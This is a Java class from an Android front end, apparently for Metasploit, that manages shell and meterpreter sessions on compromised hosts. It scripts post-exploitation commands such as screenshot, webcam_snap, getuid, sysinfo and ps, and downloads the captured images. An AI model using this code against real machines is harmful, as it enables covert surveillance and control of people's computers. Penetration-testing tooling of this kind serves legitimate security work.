package com.anwarelmakrahy.pwncore.console;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.commons.lang3.StringUtils;
import org.msgpack.type.Value;

import com.anwarelmakrahy.pwncore.StaticClass;
import com.anwarelmakrahy.pwncore.console.ConsoleSession.ConsoleSessionParams;
import com.anwarelmakrahy.pwncore.plugins.Downloader;
import com.anwarelmakrahy.pwncore.plugins.ImageViewerActivity;
import com.anwarelmakrahy.pwncore.plugins.ProcessesActivity;
import com.anwarelmakrahy.pwncore.plugins.ProcessesActivity.ProcessItem;
import com.anwarelmakrahy.pwncore.structures.SessionCommand;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.util.Log;

public class ControlSession {

	protected static final long WAIT_TIMEOUT = 10000;
	private boolean queryPoolActive = false;

	private String id, prompt, type;
	private int linkedHostId;

	private Context context;
	private Activity activity;

	private boolean isWindowReady = false, isWindowActive = false;

	private ConsoleSessionParams params = null;
	private Map<String, Value> info;

	private ArrayList<String> conversation = new ArrayList<String>();
	private ArrayList<String> queryPool = new ArrayList<String>();
	private ArrayList<String> cmdQueryPool = new ArrayList<String>();
	
	private ArrayList<String> stringCommands = new ArrayList<String>();
	private ArrayList<String> implCommands = new ArrayList<String>();
	private Map<String, SessionCommand> structCommands = new HashMap<String, SessionCommand>();

	public ControlSession(Context context, String type, String id,
			Map<String, Value> info) {
		this.id = id;
		this.context = context;
		this.type = type;
		this.prompt = type + " > ";
		this.info = info;
		
		getAvailableCommands();
	}

	public ControlSession(Context context, String type, String id,
			Map<String, Value> info, ConsoleSessionParams params) {
		this.id = id;
		this.context = context;
		this.params = params;
		this.type = type;
		this.prompt = type + " > ";
		this.info = info;
		this.isWindowReady = params.hasWindowViews();

		getAvailableCommands();
	}

	public void setLinkedHostId(int i) {
		this.linkedHostId = i;
	}
	
	public int getLinkedHostId() {
		return linkedHostId;
	}
	
	private void getAvailableCommands() {
		startReadListener();
		write("help");
		addToQuery(
				StaticClass.PWNCORE_SESSION_GET_AVAILABLE_COMMANDS);
	}

	public void setWindowActive(boolean flag, Activity activity) {
		isWindowActive = flag;
		if (params != null && activity != null) {
			params.setAcivity(activity);
			this.isWindowReady = params.hasWindowViews();
		}

		if (flag) {
			params.getCmdView().setText(
					StringUtils.join(conversation.toArray()));
			params.getPromptView().setText(prompt);
		}
	}

	public String getId() {
		return id;
	}

	public Map<String, Value> getInfo() {
		return info;
	}

	public boolean isReady() {
		return true;
	}

	private void notifyQueryPool(final String data) {
		new Thread(new Runnable() {
			@Override
			public void run() {
				queryPool.add(data);
				if (!queryPoolActive) {
					queryPoolActive = true;
					for (int i = 0; i < queryPool.size(); i++) {

						Intent tmpIntent = new Intent();
						tmpIntent.setAction(type.equals("shell") ? StaticClass.PWNCORE_CONSOLE_SHELL_WRITE
								: type.equals("meterpreter") ? StaticClass.PWNCORE_CONSOLE_METERPRETER_WRITE
										: null);

						tmpIntent.putExtra("id", id);
						tmpIntent.putExtra("data", queryPool.get(i));
						context.sendBroadcast(tmpIntent);

						queryPool.remove(i);

						try {
							Thread.sleep(1000);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}

					}
					queryPoolActive = false;
				}
			}
		}).start();
	}

	private void read() {
		Intent tmpIntent = new Intent();
		tmpIntent
				.setAction(type.equals("shell") ? StaticClass.PWNCORE_CONSOLE_SHELL_READ
						: type.equals("meterpreter") ? StaticClass.PWNCORE_CONSOLE_METERPRETER_READ
								: null);

		tmpIntent.putExtra("id", id);
		context.sendBroadcast(tmpIntent);
	}

	public void newRead(final String data) {

		if (data.trim().length() > 0) {
			conversation.add(data);
			processIncomingData(data);
			appendToLog(data);
		}
	}

	public void processVisualCommand(String cmd, Activity activity) {
		this.activity = activity;
		if (cmd.equals("screenshot")) {
			write(cmd);
			addToQuery(StaticClass.PWNCORE_SESSION_SCREENSHOT);
		}
		
		else if (cmd.equals("webcam_snap")) {
			write("webcam_list");
			addToQuery(StaticClass.PWNCORE_SESSION_WEBCAM_LIST);
		}
		
		else if (cmd.equals("getuid")) {
			write(cmd);
			addToQuery(StaticClass.PWNCORE_SESSION_GETUID);
		}
		
		else if (cmd.equals("sysinfo")) {
			write(cmd);
			addToQuery(StaticClass.PWNCORE_SESSION_SYSINFO);
		}
		
		else if (cmd.equals("idletime")) {
			write(cmd);
			addToQuery(StaticClass.PWNCORE_SESSION_IDLETIME);
		}
		 
		else if (cmd.equals("ps")) {
			context.startActivity(
					new Intent(context, ProcessesActivity.class)
					.putExtra("sessionId", id)
					.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
		}
		
		else if (cmd.equals("pslist")) {
			write("ps");
			addToQuery(StaticClass.PWNCORE_SESSION_PROCESSES);
		}
	}
	
	private void addToQuery(String req) {
		if (!cmdQueryPool.contains(req))
			cmdQueryPool.add(req);
	}

	private void removeFromQuery(String req) {
		while (cmdQueryPool.contains(req))
			cmdQueryPool.remove(req);
	}
	
	private void showMessageDialog(final String title, final String content) {
		 if (activity != null)
         	activity.runOnUiThread(new Runnable(){
					@Override
					public void run() {
						AlertDialog msgDialog;
		                AlertDialog.Builder builder = new AlertDialog.Builder(activity != null ? activity: context);
		                builder.setTitle(title);
		                builder.setMessage("\n" + content);
		                builder.setNeutralButton("Done", null);
		                msgDialog = builder.create();
		                msgDialog.show();
					}
				});
	}
	
	private void processIncomingData(String data) {
		Log.d("session", data.length() > 0 ? data : "");
		data = data.replaceAll(" +", " ");
		
		if (type.equals("meterpreter")) {
			if (cmdQueryPool.size() > 0) {
				if (cmdQueryPool.contains(
						StaticClass.PWNCORE_SESSION_GET_AVAILABLE_COMMANDS) &&
						data.startsWith("\nCore Commands") &&
						data.endsWith("\n\n")) {
					parseAvailableCommands(data);
					removeFromQuery(
							StaticClass.PWNCORE_SESSION_GET_AVAILABLE_COMMANDS);
				}
				
				else if (cmdQueryPool.contains(
						StaticClass.PWNCORE_SESSION_SCREENSHOT) &&
						data.split("\n")[0].trim().startsWith("Screenshot saved to:")) {
					
					String path = data.split("\n")[0].trim().substring(21).trim();
					write("ls " + path);
					addToQuery(StaticClass.PWNCORE_SESSION_GET_SCREENSHOT_SIZE);
					removeFromQuery(StaticClass.PWNCORE_SESSION_SCREENSHOT);
				}
				
				else if (cmdQueryPool.contains(
						StaticClass.PWNCORE_SESSION_GET_SCREENSHOT_SIZE) &&
						data.replace("  ", " ").split(" ").length == 7) {
					String[] args = data.replace("  ", " ").trim().split(" ");
					downloader = new Downloader(args[6], Integer.parseInt(args[1]), "screenshot", true);
					write(downloader.getDownloadCmd());
					addToQuery(StaticClass.PWNCORE_SESSION_GET_SCREENSHOT_FILE);
					removeFromQuery(StaticClass.PWNCORE_SESSION_GET_SCREENSHOT_SIZE);
					pingReadListener();
				}
				
				else if (cmdQueryPool.contains(
						StaticClass.PWNCORE_SESSION_WEBCAM_LIST) &&
						data.split(" ")[0].endsWith(":") &&
						data.toLowerCase().contains("webcam")) {
					final String[] webcams = data.split("\n");
					
	                if (activity != null)
	                	activity.runOnUiThread(new Runnable(){
							@Override
							public void run() {
								AlertDialog webcamsDialog;
				                AlertDialog.Builder builder = new AlertDialog.Builder(activity != null ? activity: context);
				                builder.setTitle("Select Webcam");
				                builder.setSingleChoiceItems(webcams, -1, new DialogInterface.OnClickListener() {
				                public void onClick(DialogInterface dialog, int item) {					               
				                		write("webcam_snap -i " + Integer.toString(item + 1) + " -v false");
				                		addToQuery(StaticClass.PWNCORE_SESSION_WEBCAM_SNAP);
				                    	dialog.dismiss();    
			                		}
				                });
				                webcamsDialog = builder.create();
								webcamsDialog.show();
							}
						});
	                
	                removeFromQuery(StaticClass.PWNCORE_SESSION_WEBCAM_LIST);
				}
				
				else if (cmdQueryPool.contains(
						StaticClass.PWNCORE_SESSION_WEBCAM_SNAP) &&
						data.contains("Webcam shot saved to:")) {
					
					for (String path: data.split("\n")) {
						if (path.startsWith("Webcam shot saved to:")) {
							path = path.trim().substring(21).trim();
							write("ls " + path);
							addToQuery(StaticClass.PWNCORE_SESSION_GET_WEBCAM_SNAP_SIZE);
							removeFromQuery(StaticClass.PWNCORE_SESSION_WEBCAM_SNAP);
							break;
						}
					}
				}
				
				else if (cmdQueryPool.contains(
						StaticClass.PWNCORE_SESSION_GET_WEBCAM_SNAP_SIZE) &&
						data.replace("  ", " ").split(" ").length == 7) {
					String[] args = data.replace("  ", " ").trim().split(" ");
					downloader = new Downloader(args[6], Integer.parseInt(args[1]), "webcam_snap", true);
					write(downloader.getDownloadCmd());
					addToQuery(StaticClass.PWNCORE_SESSION_GET_WEBCAM_SNAP_FILE);
					removeFromQuery(StaticClass.PWNCORE_SESSION_GET_WEBCAM_SNAP_SIZE);
					pingReadListener();
				}
				
				else if (cmdQueryPool.contains(
						StaticClass.PWNCORE_SESSION_GETUID) &&
						data.startsWith("Server ")) {
					showMessageDialog("getuid", data);
					removeFromQuery(StaticClass.PWNCORE_SESSION_GETUID);
				}
				
				else if (cmdQueryPool.contains(
						StaticClass.PWNCORE_SESSION_SYSINFO) &&
						data.startsWith("Computer ")) {
					showMessageDialog("sysinfo", data);
					removeFromQuery(StaticClass.PWNCORE_SESSION_SYSINFO);
				}
				
				else if (cmdQueryPool.contains(
						StaticClass.PWNCORE_SESSION_IDLETIME) &&
						data.startsWith("User has been idle")) {
					showMessageDialog("idletime", data);
					removeFromQuery(StaticClass.PWNCORE_SESSION_IDLETIME);
				}
				else if (cmdQueryPool.contains(
						StaticClass.PWNCORE_SESSION_PROCESSES) &&
						data.startsWith("\nProcess List\n")) {
					parseProcessList(data);
					removeFromQuery(StaticClass.PWNCORE_SESSION_PROCESSES);
				}
			}
		}
	}

	private void parseProcessList(String data) {
		ProcessesActivity.processes.clear();
		String[] lines = data.split("\n");
		String proc;
		ProcessItem process;
		
		for (int i=0; i<lines.length; i++) {
			if (lines[i].trim().length() > 0 && 
					lines[i].trim().startsWith("Process List")) {
				i+=4;
				continue;
			}
			else if (lines[i].trim().length() > 0) {
				proc = lines[i].trim().replaceAll(" +", " ");
				process = new ProcessItem();
				process.setId(proc.split(" ")[0]);
				process.setName(proc.split(" ")[2]);
				ProcessesActivity.processes.add(process);
			}
		}
		
		if (ProcessesActivity.processesAdapter != null && 
				activity != null)
			activity.runOnUiThread(new Runnable() {
				@Override
				public void run() {
					ProcessesActivity.processesAdapter.notifyDataSetChanged();
				}
			});
		ProcessesActivity.processesAdapter.notifyDataSetChanged();
	}

	Downloader downloader;
	private void parseAvailableCommands(String data) {
		String[] lines = data.split("\n");
		String codename;
		SessionCommand cmd;
		for (int i=0; i<lines.length; i++) {
			if (lines[i].trim().length() > 0 && 
					lines[i].trim().endsWith("Commands") &&
					i+1 < lines.length &&
					lines[i+1].trim().endsWith("==") &&
					lines[i+1].trim().startsWith("==")) {
				i+=4;
				continue;
			}
			else if (lines[i].trim().length() > 0) {
				codename = lines[i].trim().split(" ")[0];			
				if (StaticClass.getSessionImplCmds().contains(codename)) {		
					cmd = new SessionCommand(codename);
					cmd.setDescription(lines[i].trim().substring(codename.length()).trim());
					cmd.setImplemented(true);
					structCommands.put(codename, cmd);
				}
			}
		}
	}
	
	private void startReadListener() {
		new Thread(new Runnable() {
			@Override
			public void run() {
				while (true) {
					try {
						read();
						Thread.sleep(30000);
					} catch (InterruptedException e) {
					}
				}
			}
		}).start();
	}
	
	public void pingReadListener() {
		new Thread(new Runnable() {
			@Override
			public void run() {
				for (int i = 0; i < 10; i++) {
					try {
						read();
						Thread.sleep(1000);
					} catch (InterruptedException e) {
					}
				}
			}
		}).start();
	}

	public void write(final String data) {
		notifyQueryPool(data);
		conversation.add(prompt + data + "\n");
		appendToLog(prompt + data);
	}

	private void appendToLog(final String data) {
		if (isWindowActive && isWindowReady) {
			params.getActivity().runOnUiThread(new Runnable() {
				@Override
				public void run() {
					if (data != null)
						params.getCmdView().append(data + "\n");
				}
			});
		}
	}

	public void waitForReady() {
		while (!isReady()) {
			try {
				Thread.sleep(200);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
	}

	public void destroy() {
		Intent tmpIntent = new Intent();
		tmpIntent.putExtra("id", id);
		// tmpIntent.setAction(StaticsClass.PWNCORE_CONSOLE_SHELL_DESTROY);
		tmpIntent.setAction(StaticClass.PWNCORE_CONSOLE_METERPRETER_DESTROY);
		context.sendBroadcast(tmpIntent);
	}

	public String getType() {
		return type;
	}

	public String getPeer() {
		if (info.containsKey("tunnel_peer"))
			return info.get("tunnel_peer").asRawValue().getString();
		else
			return "unknown";
	}

	public String getViaExploit() {
		if (info.containsKey("via_exploit"))
			return info.get("via_exploit").asRawValue().getString();
		else
			return "unknown";
	}

	public String getViaPayload() {
		if (info.containsKey("via_payload"))
			return info.get("via_payload").asRawValue().getString();
		else
			return "unknown";
	}

	public void newRead(byte[] data) {
		if (data.length > 0) {
			conversation.add(data.length + " bytes recieved");
			processIncomingDataBytes(data);
			appendToLog(data.length + " bytes recieved");
		}
	}

	protected void processIncomingDataBytes(byte[] data) {
		Log.d("session", "got " + data.length + " bytes");
		if (type.equals("meterpreter") && 
				cmdQueryPool.size() > 0) {
			
			if (cmdQueryPool.contains(
					StaticClass.PWNCORE_SESSION_GET_SCREENSHOT_FILE) &&
					downloader != null &&
					!downloader.hasFinished()) {
				downloader.addToBuffer(data);
				if (downloader.hasFinished()) {				
					context.startActivity(
							new Intent(context, ImageViewerActivity.class)
							.putExtra("type", "screenshot")
							.putExtra("path", downloader.getFullPath())
							.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
					downloader = null;
					removeFromQuery(StaticClass.PWNCORE_SESSION_GET_SCREENSHOT_FILE);
				}
				else pingReadListener();
			}
			
			else if (cmdQueryPool.contains(
					StaticClass.PWNCORE_SESSION_GET_WEBCAM_SNAP_FILE) &&
					downloader != null &&
					!downloader.hasFinished()) {
				downloader.addToBuffer(data);
				if (downloader.hasFinished()) {				
					context.startActivity(
							new Intent(context, ImageViewerActivity.class)
							.putExtra("type", "webcam_snap")
							.putExtra("path", downloader.getFullPath())
							.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
					downloader = null;
					removeFromQuery(StaticClass.PWNCORE_SESSION_GET_WEBCAM_SNAP_FILE);
				}
				else pingReadListener();		
			}
		}
	}

	public void updateAllCommands() {
		stringCommands.clear();
		for (Map.Entry<String, SessionCommand> entry : structCommands
				.entrySet())
			stringCommands.add(entry.getKey());
	}

	public List<String> getAllStringCommands() {
		return stringCommands;
	}

	public Map<String, SessionCommand> getAllCommands() {
		return structCommands;
	}

	public void updateImplementedCommands() {
		implCommands.clear();
		for (Map.Entry<String, SessionCommand> entry : structCommands
				.entrySet())
			if (entry.getValue().isImplemented())
				implCommands.add(entry.getKey());
	}

	public List<String> getImplementedCommands() {
		return implCommands;
	}
}
